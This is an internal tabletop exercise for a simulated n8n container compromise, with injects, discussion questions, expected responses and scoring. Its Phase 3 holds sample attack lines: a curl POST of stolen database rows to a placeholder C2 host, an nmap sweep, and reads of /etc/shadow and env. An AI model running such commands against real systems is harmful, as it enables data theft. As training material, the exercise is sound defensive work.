# Tabletop Exercise: Operation Phantom Container

**Organization:** Organization Security Operations Platform
**Exercise Date:** [YYYY-MM-DD - Schedule next exercise]
**Exercise Type:** Discussion-Based Tabletop Exercise (TTX)
**NIST 800-53 Controls:** CP-4 (Contingency Plan Testing), IR-3 (Incident Response Testing)
**Classification:** Internal Use Only
**Version:** 1.0

> **Status note (2026-09-01):** this document describes the DigitalOcean-era baseline as assessed. That environment was retired 2026-08. The platform now runs on an Oracle Cloud (OCI) ARM instance with a partial stack (3 containers live); the remaining services are pending ARM rebuild. A re-baseline of this document is queued and tracked in the POA&M.

---

## 1. Exercise Overview

### 1.1 Purpose

This tabletop exercise tests the Organization's ability to detect, contain, investigate, and recover from a multi-stage container compromise. It validates incident response procedures, business continuity planning, and access control effectiveness in a discussion-based format.

### 1.2 Objectives

| # | Objective | NIST Control |
|---|-----------|-------------|
| 1 | Validate detection and initial triage procedures for container runtime alerts | IR-4, SI-4 |
| 2 | Test containment decision-making when lateral movement is detected | IR-4, SC-7 |
| 3 | Evaluate evidence preservation procedures during active compromise | IR-4, AU-11 |
| 4 | Assess credential rotation and secrets management under incident conditions | IA-5, SC-28 |
| 5 | Verify communication protocols (internal escalation, external notification) | IR-6, IR-7 |
| 6 | Validate service recovery order and integrity verification procedures | CP-10, SI-7 |
| 7 | Test post-incident review and lessons learned processes | IR-4(1) |

### 1.3 Participants

| Role | Responsibility | Name |
|------|---------------|------|
| **Exercise Director** | Facilitates the exercise, introduces injects, manages time | [Assign] |
| **System Owner** | Primary decision maker, incident commander | System Owner |
| **Security Analyst** | Detection triage, forensic analysis, evidence collection | [Assign or simulate] |
| **Operations Lead** | Service management, recovery execution | [Assign or simulate] |
| **Communications Lead** | Internal/external notification, documentation | [Assign or simulate] |
| **Observer/Evaluator** | Evaluates responses against criteria, takes notes | [Assign] |

> For a single-operator environment, the System Owner may assume all operational roles. The exercise remains valuable as a structured walkthrough of decision points.

### 1.4 Exercise Duration

| Segment | Duration |
|---------|----------|
| Pre-brief and rules | 10 minutes |
| Phase 1 - Initial Detection | 15 minutes |
| Phase 2 - Escalation | 15 minutes |
| Phase 3 - Lateral Movement | 15 minutes |
| Phase 4 - Containment & Recovery | 15 minutes |
| Phase 5 - Post-Incident | 15 minutes |
| Hot wash / debrief | 15 minutes |
| **Total** | **~100 minutes** |

---

## 2. Exercise Rules

1. **No real actions are taken.** All responses are verbal or written. No commands are executed, no containers are stopped, no credentials are rotated during the exercise.
2. **Discussion-based only.** Participants describe what they *would* do, not what they *are* doing.
3. **No blame.** The exercise evaluates processes, not individuals. All gaps are improvement opportunities.
4. **All communications are simulated.** References to alerting platforms, chat channels, or email notifications are hypothetical.
5. **Assume the scenario is real.** Participants should respond as they would during an actual incident.
6. **Time is compressed.** Real incidents unfold over hours or days; this exercise compresses timelines for discussion efficiency.
7. **Reference existing documentation.** Participants should cite specific runbooks, policies, or procedures when describing their actions.
8. **The Exercise Director controls the clock.** Phase transitions happen on the director's signal, not based on participant readiness.

---

## 3. Scenario: Operation Phantom Container

### Background

It is a normal operating day. All 19 containers are running on the VPS (`alpha-node`). Datadog shows green across the board. The most recent deployment was 48 hours ago, a routine workflow update to svc-automation. The cloud firewall is in its standard deny-all configuration with svc-tunnel as the sole ingress path.

The current access posture:
- System Owner has operator-level access via svc-gateway (no active admin session)
- No JIT elevation requests are pending
- Last SSH session ended 6 hours ago
- All audit logs are shipping normally to Datadog via svc-event-shipper, Fluentd, and svc-langfuse-worker (for Squire trace observability)

---

### Phase 1 - Initial Detection (T+0)

**INJECT:**

At 14:32 UTC, Falco (svc-detection) fires an alert:

```
Priority: Critical
Rule: Terminal shell in container
Output: Shell spawned in svc-automation (user=node, parent=node,
    cmdline=sh -c /bin/sh, container_id=a1b2c3d4e5f6)
```

<!-- TODO(et): the current Sigma rule detections/sigma/infra/container-shell-spawn-restricted.yml allowlists shell-spawn alerts for PostgreSQL, Vault, Tunnel, Keycloak, Falco, and OpenClaw. svc-automation (n8n) is NOT in that list, so this inject would not trigger the rule as configured. Either add n8n to the rule's container allowlist OR change the inject service to one that is already covered. -->


Simultaneously, Datadog flags an anomalous DNS query originating from svc-automation:

```
Source: svc-automation (net-core)
Query: data.suspicious-c2-domain.xyz (TXT record)
Frequency: 3 queries in 60 seconds
Baseline: This domain has never been queried before
```

The svc-automation healthcheck continues to pass. No user-initiated workflows are currently executing.

**DISCUSSION QUESTIONS:**

1. Who is notified first, and through what channel?
2. What is the initial severity classification for this alert combination?
3. What are the first three actions the responder takes (in order)?
4. What logs and data sources do you consult to begin triage?
5. At what point do you consider this a confirmed incident versus a false positive?
6. Do you need to elevate access (JIT admin request) at this stage?

---

### Phase 2 - Escalation (T+15 minutes)

**INJECT:**

Investigation reveals the root cause: the automation platform's webhook endpoint was exploited via a crafted JSON payload. The payload exploited a deserialization vulnerability in a third-party node module used by a custom workflow. The attacker achieved remote code execution and established a reverse shell.

svc-detection fires a second alert:

```
Priority: Critical
Rule: Read sensitive file untrusted
Output: Sensitive file opened for reading
    (user=node, command=cat /etc/shadow, file=/etc/shadow,
    container=svc-automation)
```

Datadog now shows:

```
svc-automation network activity:
 - Outbound: DNS TXT queries to data.suspicious-c2-domain.xyz (ongoing)
 - Outbound: HTTPS connection to 198.51.100.42:443 (not in baseline)
 - Inbound: No new connections

svc-automation process tree:
 node (PID 1) → sh → cat /etc/shadow
 node (PID 1) → sh → ip addr show
 node (PID 1) → sh → cat /proc/net/tcp
 node (PID 1) → sh → env
```

The attacker appears to be conducting host reconnaissance: reading credentials, mapping network interfaces, and enumerating environment variables.

**DISCUSSION QUESTIONS:**

1. This is now a confirmed incident. What severity level do you assign?
2. Do you isolate svc-automation immediately, or continue observing to gather intelligence? What factors drive this decision?
3. How do you preserve evidence from the compromised container before taking action?
  - Container filesystem state
  - Process memory
  - Network connections
  - Log history
4. The attacker ran `env` inside svc-automation. What secrets does this container have access to?
  - Database credentials (svc-db connection string)
  - Automation platform encryption key
  - Automation platform JWT secret
  - Any API keys configured in workflows
5. Given the `env` execution, do you rotate secrets now or after containment? Justify your decision.
6. What is your communication at this point (internal team, management, external)?

---

### Phase 3 - Lateral Movement Attempt (T+30 minutes)

**INJECT:**

svc-detection fires a third critical alert:

```
Priority: Critical
Rule: Unexpected outbound connection
Output: Unexpected connection from svc-automation to svc-db
    on port 5432 (user=node, command=psql, container=svc-automation)
```

Datadog shows a spike in database activity:

```
svc-db metrics (last 5 minutes):
 - Active connections: 8 (baseline: 2-3)
 - Queries/second: 340 (baseline: 5-15)
 - Data transferred out: 47 MB (baseline: <1 MB/5min)
 - Top queries:
   SELECT * FROM execution_entity LIMIT 10000;
   SELECT * FROM credentials_entity;
   SELECT * FROM workflow_entity;
   # Realistic exfil for the n8n DB role (which does NOT hold pg_read_server_files
   # or replication privileges, so `COPY ... TO STDOUT` would error). The
   # attacker instead chunks SELECTs and POSTs the rows out via curl from the
   # compromised container, or pipes them into a DNS TXT-record encoder.
   SELECT * FROM execution_entity WHERE id BETWEEN 1 AND 1000;
   SELECT * FROM execution_entity WHERE id BETWEEN 1001 AND 2000;
   # Followed by, from inside svc-automation: curl -X POST https://<c2>/ingest -d @rows.json
```

The attacker has used the database credentials from svc-automation's environment variables to connect directly to svc-db and is exfiltrating workflow execution history, stored credentials (encrypted), and workflow definitions. The exfiltrated data is being staged to the C2 domain via DNS TXT record exfiltration and an HTTPS POST channel.

Meanwhile, svc-detection also flags. The n8n container image does NOT ship with `nmap`, so the attacker first dropped a scanning binary (which itself trips the `n8n unexpected binary` Sigma rule). The inject below assumes that prior alert has fired.

```
T+0:  Priority: High
      Rule: n8n unexpected binary (T1105)
      Output: Unexpected file written and made executable in svc-automation
              (file=/tmp/.scan, container=svc-automation)

T+10s Priority: Warning
      Rule: Network tool in container
      Output: nmap process detected in svc-automation
              (user=node, cmdline=/tmp/.scan -sn 172.18.0.0/16)
```

Alternative realistic path: if the attacker uses tools already in the image, the same scan can be performed with `nc -zv` against each candidate IP (which would not trip the unexpected-binary rule and tests whether the playbook catches port-scan patterns without binary-drop).

The attacker is scanning the internal bridge network to identify other reachable containers.

**DISCUSSION QUESTIONS:**

1. What is the immediate action to stop the data exfiltration? Consider:
  - Disconnect svc-automation from the network
  - Kill the database connection from svc-db side
  - Revoke the database credentials
  - Shut down svc-automation entirely
  - What is the order of operations and why?
2. Can you quantify or scope what data has been exfiltrated? How?
3. The `credentials_entity` table was queried. Are those credentials readable? (Consider: svc-automation encrypts stored credentials - what is the encryption key?)
4. What is your communication plan at this point?
  - Internal: Who needs to know and what do they need to do?
  - External: Are there notification obligations? (Customers, partners, authorities)
5. Do you invoke the Disaster Recovery Plan (DRP)? What criteria determine this decision?
6. The attacker scanned the internal network. What other containers could they have reached, and what is the blast radius if they pivoted?

---

### Phase 4 - Containment & Recovery (T+1 hour)

**INJECT:**

The following containment actions have been executed:
- svc-automation container disconnected from `internal-net` bridge network
- Database credentials rotated on svc-db (old credentials revoked; existing sessions terminated via `pg_terminate_backend`)
- svc-automation container stopped (not removed; preserved for forensics)
- C2 egress blocked: DigitalOcean Cloud Firewalls only support IP- and port-based rules, so the actual containment was:
  - Cloudflare DNS Firewall block on `suspicious-c2-domain.xyz` (domain-based blocking lives at the resolver / Cloudflare layer)
  - host-level iptables DROP on the resolved IP set as a defense-in-depth backstop
- All other containers verified running with expected process trees (`docker top` per container; distroless containers checked from host via nsenter)
- Teleport session recordings confirm the attack did not originate from an SSH session (no interactive sessions active during the incident window)
- CI/CD pipeline integrity verified: no unauthorized commits or workflow changes in the code repository (`gh run list`, `gh api /repos/<owner>/<repo>/commits`)

Datadog confirms:
- Anomalous DNS queries have stopped
- Database query rate has returned to baseline
- No other containers show unexpected network activity
- Audit log hash chain is intact (no tampering detected)

**DISCUSSION QUESTIONS:**

1. How do you rebuild svc-automation? Consider:
  - Do you restore from backup or deploy a clean image?
  - How do you verify the replacement image is not compromised?
  - What configuration changes are needed before redeployment?
2. What is the service recovery order? Which services must be verified first?
  - svc-db (data integrity verification)
  - svc-secrets (seal status, no unauthorized access)
  - svc-tunnel (ingress path integrity)
  - svc-automation (rebuilt, hardened)
  - svc-detection rules updated
3. How do you verify no persistence mechanism was installed?
  - Container filesystem diff against known-good image
  - Check for cron jobs, modified binaries, or planted SSH keys
  - Verify no new Docker volumes or networks were created
  - Inspect host filesystem for container escape artifacts
4. What secrets need rotation beyond the database credentials?
  - Automation platform encryption key
  - Automation platform JWT secret
  - Any API keys that were stored in svc-automation workflows
  - Webhook authentication tokens (the initial attack vector)
5. How do you verify svc-db data integrity? The attacker had read access - did they also modify records?
6. What detection rules need updating based on this incident?

---

### Phase 5 - Post-Incident Review (T+24 hours)

**INJECT:**

The incident timeline has been reconstructed from audit logs, svc-detection alerts, Datadog data, and Teleport session recordings:

```
14:30 UTC Attacker sends crafted webhook payload to svc-automation
14:30 UTC Deserialization exploit triggers, reverse shell established
14:32 UTC svc-detection fires: shell spawned in svc-automation
14:32 UTC DNS anomaly detected: C2 domain queries
14:33 UTC Attacker reads /etc/shadow (no useful credentials - container user)
14:35 UTC Attacker runs env, obtains database credentials and API keys
14:37 UTC Attacker maps network: ip addr, /proc/net/tcp
14:40 UTC Attacker connects to svc-db using stolen credentials
14:40 UTC Data exfiltration begins via bulk SELECT queries
14:42 UTC svc-detection fires: unexpected connection to svc-db
14:42 UTC Attacker runs nmap scan of internal network
14:45 UTC Containment initiated: svc-automation network disconnected
14:46 UTC Database credentials rotated
14:47 UTC svc-automation container stopped
15:30 UTC Full containment confirmed, recovery begins
18:00 UTC svc-automation rebuilt and redeployed with hardened configuration
```

Total time: Detection at T+2min, containment initiated at T+15min, full containment at T+17min, recovery complete at T+3.5h.

**DISCUSSION QUESTIONS:**

1. **Root Cause:** What is the root cause? How do you prevent recurrence?
  - Vulnerable third-party dependency in a custom workflow node
  - Webhook endpoint accepting arbitrary JSON without schema validation
  - Database credentials accessible as environment variables in svc-automation
2. **Detection Gaps:** What did the detection stack catch? What did it miss?
  - Caught: Shell spawn, sensitive file read, unexpected network connection, DNS anomaly
  - Missed: Initial webhook exploitation (no WAF/request validation), `env` command execution (was it a detection rule gap?)
  - What new detection rules are needed?
3. **Policy Changes:** What policies or procedures need updating?
  - Webhook authentication and schema validation requirements
  - Container network segmentation (does svc-automation really need direct database access?)
  - Secrets injection method (environment variables vs. mounted secrets)
  - Dependency scanning frequency and patch SLA
4. **Architecture Changes:** What infrastructure modifications are recommended?
  - Network microsegmentation (per-service network policies)
  - Egress filtering (allowlist-only outbound connections per container)
  - Database connection proxy with query auditing
  - WAF or request validation layer at the tunnel ingress
5. **Documentation:** How do you document this for compliance?
  - Incident report with full timeline
  - Evidence preservation chain of custody
  - Lessons learned and corrective actions
  - Updated risk register entries (R-04, R-10 from the Risk Assessment)
  - POA&M entries for architectural changes
6. **Metrics:** What metrics do you report?
  - Mean Time to Detect (MTTD): 2 minutes
  - Mean Time to Contain (MTTC): 15 minutes
  - Mean Time to Recover (MTTR): 3.5 hours (target <4h; this is 88% of target, flag as marginal in the scorecard, not "well within")
  - Data exposure scope: workflow data, encrypted credentials, execution history

---

### Status of Phase 5 Gaps as of 2026-06-24

The Phase 5 discussion enumerates detection gaps and architectural changes. Status of each at this date:

| Item | Type | Status as of 2026-06-24 |
|------|------|-------------------------|
| `env` command execution Sigma rule | Detection | **OPEN**: no rule added since TTX authored 2026-03-11 |
| Bulk SELECT rate Sigma rule (postgres log pattern) | Detection | **OPEN** |
| Network scanner Sigma rule (post-binary-drop) | Detection | **OPEN** (covered partially by existing `n8n-unexpected-binary.yml`) |
| Webhook HMAC signing | Policy / Code | **OPEN** |
| Container network microsegmentation (svc-automation isolated from svc-db) | Architecture | **OPEN** |
| Egress allowlists per container | Architecture | **OPEN** |
| Database query proxy with anomaly detection | Architecture | **OPEN** |
| WAF / request validation at tunnel ingress | Architecture | **OPEN** |
| Mandatory webhook authentication policy | Policy | **OPEN** |
| Secrets injection via mounted files (deprecate env vars) | Architecture | **OPEN** |
| Dependency scanning SLA (critical patches within 24h) | Policy | **IN-PROGRESS**: Trivy + Renovate are wired in CI; SLA not yet codified |

> The next TTX run should use "detection rules added since last exercise" as an evaluation criterion. As of this status snapshot, 0 of the 4 detection gaps identified at the original exercise have been closed in 3+ months. <!-- TODO(et): file POAM entries for each OPEN item above so the gaps are tracked in POAM_PLAN_OF_ACTION.md rather than only here. -->

---

## 4. Expected Responses

This section documents the expected correct actions for each phase, referencing existing policies and procedures.

### Phase 1 - Expected Response

| Action | Expected Behavior | Reference |
|--------|------------------|-----------|
| **Notification** | System Owner alerted via Datadog push notification and Telegram bot alert | IR-6 |
| **Severity** | Classified as **Severity 1 (Critical)** - anomalous shell execution + suspicious DNS from same container indicates probable compromise | IR-4 |
| **First 3 actions** | 1. Verify alert is not a false positive (check if a scheduled workflow spawned the shell). 2. Check Datadog for correlated indicators (the DNS anomaly confirms malicious activity). 3. Begin incident log - document timestamp, alert details, initial assessment. | IR-4, IR-5 |
| **Data sources** | svc-detection alerts, Datadog container logs, svc-automation workflow execution history, Teleport session recordings (verify no SSH-initiated activity) | AU-6 |
| **Incident confirmation** | Two independent indicators (shell spawn + anomalous DNS) from different detection sources confirm this is a real incident, not a false positive | SI-4 |
| **Access elevation** | JIT admin request should be submitted now - containment actions will require root-level access (network manipulation, container management) | AC-6 |

### Phase 2 - Expected Response

| Action | Expected Behavior | Reference |
|--------|------------------|-----------|
| **Severity** | Maintain **Severity 1** - confirmed RCE with active reconnaissance confirms hostile actor with foothold | IR-4 |
| **Isolate vs. observe** | **Isolate immediately.** The attacker has already run `env` (secrets compromised) and is actively reconning. Further observation yields diminishing intelligence returns while increasing blast radius. | IR-4 |
| **Evidence preservation** | Before isolation: 1. Capture container filesystem snapshot (`docker export`). 2. Record running processes (`docker top`). 3. Dump network connections (`docker exec netstat`). 4. Ensure svc-detection logs are preserved in Datadog. | IR-4, AU-11 |
| **Compromised secrets** | Database credentials (DB_USER/DB_PASS), encryption key, JWT secret, and any API keys stored in workflow credentials are all potentially compromised | SC-28 |
| **Secret rotation timing** | **Rotate database credentials immediately** - the attacker has them and lateral movement is imminent. Other secrets can be rotated during recovery phase. Prioritize by blast radius. | IA-5 |
| **Communication** | Internal: Log all actions in the incident channel. No external communication required yet (no customer data confirmed exfiltrated). | IR-6 |

### Phase 3 - Expected Response

| Action | Expected Behavior | Reference |
|--------|------------------|-----------|
| **Stop exfiltration** | Order of operations: 1. **Disconnect svc-automation from network** (`docker network disconnect net-core svc-automation`) - fastest, stops all traffic. 2. **Revoke database credentials on svc-db** (ALTER USER, pg_terminate_backend). 3. **Stop svc-automation container** (preserve for forensics). | IR-4, SC-7 |
| **Scope exfiltration** | Query svc-db `pg_stat_activity` for the attacker's session history. Cross-reference Datadog metrics (47 MB transferred). Analyze DNS TXT record sizes to estimate data exfiltrated via C2 channel. | AU-6 |
| **Credential encryption** | **Critical insight:** svc-automation encrypts stored credentials in `credentials_entity` using `N8N_ENCRYPTION_KEY` (sourced from `CD_N8N_KEY`). The attacker ran `env` inside svc-automation, so they have that key. The encrypted blob plus the key permits offline decryption of every stored workflow credential. Assume all stored credentials are compromised and rotate them. | SC-28 |
| **Communication plan** | Internal: Incident commander briefs all stakeholders. External: No breach notification required yet - assess whether exfiltrated data includes PII or third-party credentials. Prepare notification templates as a precaution. | IR-6, IR-7 |
| **DRP invocation** | **Not yet.** The incident is contained to one service and the database. Other services are operational. DRP invocation criteria: loss of 3+ critical services or total platform unavailability. | CP-2 |
| **Blast radius** | All containers on `net-core` bridge are reachable from svc-automation. However, network access does not equal authenticated access. Containers without exposed ports or credentials in svc-automation's env are at lower risk. Priority check: svc-secrets, svc-identity. | SC-7 |

### Phase 4 - Expected Response

| Action | Expected Behavior | Reference |
|--------|------------------|-----------|
| **Rebuild approach** | **Clean image deployment**: never restore a compromised container from backup. Pull the known-good image from the trusted registry. Verify image digest against the value pinned in `docker-compose.yaml`. If Cosign signing is in place for the image, also run `cosign verify`; otherwise rely on digest pinning. <!-- TODO(et): align with PLAYBOOK_COMPROMISED_CONTAINER.md which currently lists Trivy but not Cosign. Either add Cosign to the parent playbook or remove the Cosign expectation here. --> Rebuild workflow configurations from version-controlled source. | CP-10, SI-7 |
| **Recovery order** | 1. svc-db (verify data integrity, no unauthorized modifications). 2. svc-secrets (confirm sealed, no unauthorized access). 3. svc-tunnel (verify ingress path integrity). 4. svc-detection (update rules). 5. svc-automation (clean image, new credentials, hardened config). | CP-10 |
| **Persistence check** | 1. Diff the preserved container filesystem against the base image. 2. Inspect for added cron entries, modified /etc files, planted binaries. 3. Verify no new Docker volumes, networks, or images were created on the host. 4. Check host `/var/lib/docker` for escape artifacts. 5. Verify host SSH authorized_keys file is unchanged. | SI-7 |
| **Secret rotation scope** | All secrets accessible to svc-automation: database credentials, encryption key, JWT secret, all stored workflow API keys, webhook tokens. Generate new values via secrets manager. Update all dependent configurations. | IA-5 |
| **Database integrity** | Run checksums on critical tables. Compare row counts against last known-good backup. Check for new database users, modified permissions, or planted triggers/functions. Review PostgreSQL audit log for write operations during the incident window. | SI-7 |
| **Detection rule updates** | Add rules for: `env` command execution in containers, bulk SELECT queries exceeding baseline, nmap/network scanning tools in non-security containers, outbound connections to non-baseline destinations. | SI-4 |

### Phase 5 - Expected Response

| Action | Expected Behavior | Reference |
|--------|------------------|-----------|
| **Root cause** | Third-party dependency vulnerability exploited via unauthenticated webhook. Fix: 1. Patch the vulnerable dependency. 2. Add webhook schema validation. 3. Implement HMAC request signing. 4. Add WAF rules at edge. | CA-5 |
| **Detection improvements** | Add svc-detection rules for: deserialization indicators, `env` command in non-admin containers, bulk data transfer patterns, internal network scanning. Tune DNS anomaly detection threshold. | SI-4 |
| **Policy updates** | 1. Mandatory webhook authentication policy. 2. Container network segmentation standard. 3. Secrets injection via mounted files (deprecate env vars). 4. Dependency scanning SLA: critical patches within 24 hours. | PL-2 |
| **Architecture changes** | 1. Per-service network policies (svc-automation only reaches svc-db via proxy). 2. Egress allowlists per container. 3. Database query proxy with anomaly detection. 4. WAF at tunnel ingress. | SC-7 |
| **Documentation** | Complete incident report filed. Evidence chain of custody documented. Risk register updated (R-04 and R-10 residual risk scores re-evaluated). POA&M entries created for all architectural changes. Lessons learned distributed. | IR-4(1) |
| **Metrics** | MTTD: 2 min (target: <5 min). MTTC: 15 min (target: <30 min). MTTR: 3.5 hours (target: <4 hours). All within acceptable thresholds. Track improvement over time. | IR-4 |

---

## 5. Evaluation Criteria

### 5.1 Scoring Matrix

Each criterion is scored on a 1-5 scale:

| Score | Rating | Definition |
|-------|--------|------------|
| 1 | **Unsatisfactory** | Action not taken or incorrect; would result in significant harm |
| 2 | **Needs Improvement** | Action partially taken; significant gaps in execution |
| 3 | **Satisfactory** | Action taken correctly but with delays or minor gaps |
| 4 | **Good** | Action taken correctly and promptly with minor improvements possible |
| 5 | **Excellent** | Action taken correctly, promptly, and thoroughly; best practice demonstrated |

### 5.2 Evaluation Areas

| # | Criterion | Weight | Phase(s) | Target |
|---|-----------|--------|----------|--------|
| 1 | **Detection & Triage** - Correctly identified indicators and classified severity | 20% | 1 | Severity 1 classification within 5 minutes of first alert |
| 2 | **Decision Making** - Appropriate isolation/containment decisions with clear rationale | 20% | 2, 3 | Containment decision made within 15 minutes of confirmation |
| 3 | **Evidence Preservation** - Forensic data captured before destructive containment actions | 15% | 2, 4 | Evidence captured before container shutdown |
| 4 | **Secret Management** - Identified compromised secrets and initiated rotation in correct order | 15% | 2, 3, 4 | Critical credentials (database) rotated within 20 minutes |
| 5 | **Communication** - Appropriate internal/external notifications at each phase | 10% | All | Stakeholders informed at each phase transition |
| 6 | **Recovery** - Correct rebuild procedure, verification, and service restoration order | 10% | 4 | Clean image deployment (not restore from backup); integrity verified |
| 7 | **Post-Incident** - Root cause identified, corrective actions documented, metrics calculated | 10% | 5 | Lessons learned completed within 24 hours; POA&M entries created |

### 5.3 Scorecard Template

| Criterion | Score (1-5) | Notes |
|-----------|-------------|-------|
| Detection & Triage | | |
| Decision Making | | |
| Evidence Preservation | | |
| Secret Management | | |
| Communication | | |
| Recovery | | |
| Post-Incident | | |
| **Weighted Total** | **/5.00** | |

**Rating thresholds:**
- 4.5 - 5.0: Excellent - minor refinements only
- 3.5 - 4.4: Good - targeted improvements needed
- 2.5 - 3.4: Satisfactory - significant process gaps to address
- Below 2.5: Unsatisfactory - major remediation required before next exercise

---

## 6. Lessons Learned Template

Complete this template within 5 business days of the exercise.

### 6.1 Exercise Summary

| Field | Value |
|-------|-------|
| **Exercise Date** | |
| **Participants** | |
| **Overall Score** | /5.00 |
| **Exercise Director** | |

### 6.2 What Worked Well

| # | Observation | Evidence |
|---|-------------|----------|
| 1 | | |
| 2 | | |
| 3 | | |

### 6.3 What Needs Improvement

| # | Gap Identified | Phase | Impact | Corrective Action | Owner | Target Date |
|---|---------------|-------|--------|-------------------|-------|-------------|
| 1 | | | | | | |
| 2 | | | | | | |
| 3 | | | | | | |
| 4 | | | | | | |
| 5 | | | | | | |

### 6.4 Process/Documentation Gaps

| # | Document/Process | Gap Description | Update Required |
|---|-----------------|-----------------|-----------------|
| 1 | | | |
| 2 | | | |
| 3 | | | |

### 6.5 Detection Rule Improvements

| # | Current Rule | Gap | Proposed Rule/Update | Priority |
|---|-------------|-----|---------------------|----------|
| 1 | | | | |
| 2 | | | | |
| 3 | | | | |

### 6.6 Architecture Recommendations

| # | Recommendation | Risk Addressed | Effort | Priority |
|---|---------------|---------------|--------|----------|
| 1 | | | | |
| 2 | | | | |
| 3 | | | | |

### 6.7 Action Items

| # | Action | Owner | Due Date | Status |
|---|--------|-------|----------|--------|
| 1 | | | | |
| 2 | | | | |
| 3 | | | | |
| 4 | | | | |
| 5 | | | | |

### 6.8 Sign-Off

| Role | Name | Signature | Date |
|------|------|-----------|------|
| Exercise Director | | | |
| System Owner | | | |
| Observer/Evaluator | | | |

---

## 7. Exercise Schedule

| Exercise | Frequency | Last Conducted | Next Scheduled |
|----------|-----------|---------------|----------------|
| Operation Phantom Container (Container Compromise) | Semi-annual | [Date of first run] | [+6 months] |
| [SQUIRE_TABLETOP_EXERCISE.md](SQUIRE_TABLETOP_EXERCISE.md): Squire Jailbreak and Containment | Quarterly | [Date of first run] | next slot |
| [Future: Supply Chain Compromise scenario] | Semi-annual | - | [TBD] |
| [Future: Insider Threat scenario] | Annual | - | [TBD] |
| [Future: DigitalOcean Outage / DRP scenario] | Annual | - | [TBD] |

### Scheduling Notes

- Tabletop exercises are conducted semi-annually per NIST 800-53 CP-4 and IR-3 requirements
- Each exercise should use a different scenario to test different aspects of the IR and BCP plans
- Exercises should be scheduled to avoid conflict with major deployments or maintenance windows
- Results feed into the quarterly risk register review and POA&M updates
- The scenario library should expand as the platform architecture evolves

---

## 8. Document Control

| Field | Value |
|-------|-------|
| **Document ID** | TTX-2026-001 |
| **Version** | 1.0 |
| **Status** | Approved |
| **Author** | System Owner |
| **Approver** | System Owner |
| **Classification** | Internal Use Only |
| **Created** | 2026-03-11 |
| **Last Updated** | 2026-03-11 |
| **Next Review** | 2026-09-11 |

### Revision History

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2026-03-11 | System Owner | Initial tabletop exercise - Operation Phantom Container |

### References

| Document | Identifier |
|----------|-----------|
| NIST SP 800-53 Rev. 5 | CP-4 (Contingency Plan Testing), IR-3 (Incident Response Testing) |
| NIST SP 800-61 Rev. 2 | Computer Security Incident Handling Guide |
| NIST SP 800-84 | Guide to Test, Training, and Exercise Programs for IT Plans and Capabilities |
| Incident Response Policy | Internal - docs/grc/POLICY_INCIDENT_RESPONSE.md |
| IR Playbook: Compromised Container | Internal - docs/grc/PLAYBOOK_COMPROMISED_CONTAINER.md |
| IR Playbook: Leaked Credential | Internal - docs/grc/PLAYBOOK_LEAKED_CREDENTIAL.md |
| IR Playbook: Unauthorized Access | Internal - docs/grc/PLAYBOOK_UNAUTHORIZED_ACCESS.md |
| IR Playbook: DDoS/Service Degradation | Internal - docs/grc/PLAYBOOK_DDOS_SERVICE_DEGRADATION.md |
| Risk Assessment | Internal - docs/grc/RISK_ASSESSMENT.md |
| IAM RBAC Role Map | Internal - docs/grc/IAM_RBAC_ROLE_MAP.md |
| IAM Access Review | Internal - docs/grc/IAM_ACCESS_REVIEW.md |
| CIS Docker Benchmark Risk Register | Internal - docs/grc/CIS_RISK_REGISTER.md |

### Related Risk Register Entries

This exercise directly tests the response to the following risks from the Risk Assessment:

| Risk ID | Threat | Residual Risk |
|---------|--------|---------------|
| R-04 | Webhook Exploitation | 8 (Moderate) |
| R-08 | Privilege Escalation | 5 (Low) |
| R-10 | Accidental Secret Exposure | 10 (Moderate) |
| R-14 | Data Loss | 8 (Moderate) |

---

*This exercise is conducted semi-annually. The next exercise should use a different scenario (e.g., supply chain compromise, insider threat, or DigitalOcean outage) to test a different set of response capabilities.*

---

## Cross-References

| Document | Relationship |
|----------|-------------|
| [SSP_SYSTEM_SECURITY_PLAN.md](SSP_SYSTEM_SECURITY_PLAN.md) | System Security Plan with NIST 800-53 control mapping |
| [POAM_PLAN_OF_ACTION.md](POAM_PLAN_OF_ACTION.md) | Tracks findings and remediation milestones |
| [README.md](README.md) | GRC library index and reading guide |
